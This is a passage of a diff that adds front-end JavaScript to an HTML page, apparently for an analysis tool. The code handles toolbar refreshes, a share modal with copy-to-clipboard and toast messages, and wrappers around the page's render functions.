+      outputBody.classList.add('placeholder-body');
+      outputBody.innerHTML = '<div class="placeholder"><i class="fa-solid fa-chart-line"></i>OUTPUT PANEL goes here</div>';
+      refreshToolbar();
+      const inputPanel = document.getElementById('input-panel');
+      if (inputPanel && typeof inputPanel.scrollIntoView === 'function') {
+        inputPanel.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }
+      setTimeout(() => ta.focus(), 250);
+    });
+
+    tbShare.addEventListener('click', () => {
+      if (!window.lastAnalysis) return;
+      shareTa.value = formatShareSummary(window.lastAnalysis);
+      shareModal.classList.add('open');
+      setTimeout(() => { shareTa.focus(); shareTa.select(); }, 50);
+    });
+
+    function closeShareModal() { shareModal.classList.remove('open'); }
+    shareClose.addEventListener('click', closeShareModal);
+    shareCancel.addEventListener('click', closeShareModal);
+    shareModal.addEventListener('click', (e) => { if (e.target === shareModal) closeShareModal(); });
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && shareModal.classList.contains('open')) closeShareModal();
+    });
+
+    shareCopy.addEventListener('click', async () => {
+      const ok = await copyText(shareTa.value);
+      showToast(ok ? 'Copied!' : 'Copy failed', ok ? 'ok' : 'error');
+    });
+
+    /* Hook into render lifecycle so toolbar state stays in sync */
+    const _origRenderPlaceholder = renderPlaceholderResult;
+    renderPlaceholderResult = function () {
+      _origRenderPlaceholder.apply(this, arguments);
+      refreshToolbar();
+    };
+
+    const _origRenderError = renderError;
+    renderError = function () {
+      _origRenderError.apply(this, arguments);
+      refreshToolbar();
+    };
+
+    const _origRenderRaw = renderRawFallback;
+    renderRawFallback = function () {
+      _origRenderRaw.apply(this, arguments);
+      refreshToolbar();
+    };
+
+    refreshToolbar();
+  })();
+</script>
+
+</body>
+</html>
